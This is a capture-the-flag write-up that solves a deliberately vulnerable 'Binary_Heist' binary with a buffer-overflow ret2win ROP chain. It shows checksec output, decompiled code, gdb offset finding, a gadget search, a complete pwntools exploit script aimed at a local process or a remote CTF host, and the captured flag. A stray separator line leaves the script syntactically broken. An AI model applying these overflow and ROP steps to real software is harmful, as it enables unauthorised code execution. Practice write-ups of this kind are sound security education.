# Binary_Heist

**Description**:  
Welcome `Agent 007`, infiltrate the vault and succeed in the greatest binary heist in history.

**Author:  [Ath3n1x](https://twitter.com/Ath3n1x)**

**Solution**: 
Looks like Agent 007 is back. Ok, It's `checksec` time:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
`No PIE and Partial RELRO`, so options like ret2win and got overwrite might be possible. `No canary` also.

Now lets try running the binary:
```
Agency: Welcome, Agent 007. Your mission is to infiltrate the enemy vault.
System: Enter your name for log: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
System: Log entry successful! You will be granted access on entering the correct passcodes.
Segmentation fault (core dumped)
```

Ok so we can overflow the buffer. Lets look at the binary in ida/ghidra. There seems to be a win function called `infiltrate`:
```
void infiltrate(long param_1,long param_2)

{
  undefined8 local_16;
  undefined4 local_e;
  undefined2 local_a;
  
  local_16 = 0x6c75617620746163;
  local_e = 0x78742e74;
  local_a = 0x74;
  if ((param_1 == L'\x1337c0d3') && (param_2 == L'\xacedc0de')) {
    puts("System: Operation Binary Heist - Top-Secret Flag:");
    system((char *)&local_16);
  }
  else {
    puts("WARNING: Intruder!!!. Authorities have been warned.");
  }
  return;
}
```

Yep, its a ret2win with arguments. Now we can hand everything over to gdb.

**TODO**:
*1. ~~Find offset~~*
```
pwndbg> cyclic -l daaaaaaa
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24
```
                            So a padding of length: 24.


*2. ~~Find suitable gadget~~*    
```
$ ROPgadget --binary binary_heist | grep "pop rdi"
0x0000000000401207 : pop rdi ; pop rsi ; ret
```

*3. ~~Get address of win function~~*

`0x0000000000401243  infiltrate`


*4. ~~Craft payload~~*

`payload = offset + p64(pop_rdi_rsi_ret) + p64(0x1337c0d31337c0d3) + p64(0xacedc0deacedc0de) + p64(0x401243)`

**Exploit:**
```
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main
b *input
b *infiltrate
continue
'''.format(**locals())

exe = './binary_heist'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

===========================================================

offset = b'a'*24

#io = remote("13.234.11.113",31491)
io = start()

io.recvuntil('log:')

pop_rdi_rsi_ret = 0x401207

print(elf.functions.infiltrate)

payload = offset + p64(pop_rdi_rsi_ret) + p64(0x1337c0d31337c0d3) + p64(0xacedc0deacedc0de) + p64(0x401243) 

io.sendline(payload)

io.interactive()
```

On running the script:
```
[DEBUG] Received 0x2b bytes:
    b'shaktiCTF{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140}\n'
shaktiCTF{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140}
```

:thumbsup: Success


Flag: `shaktictf{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140}`   
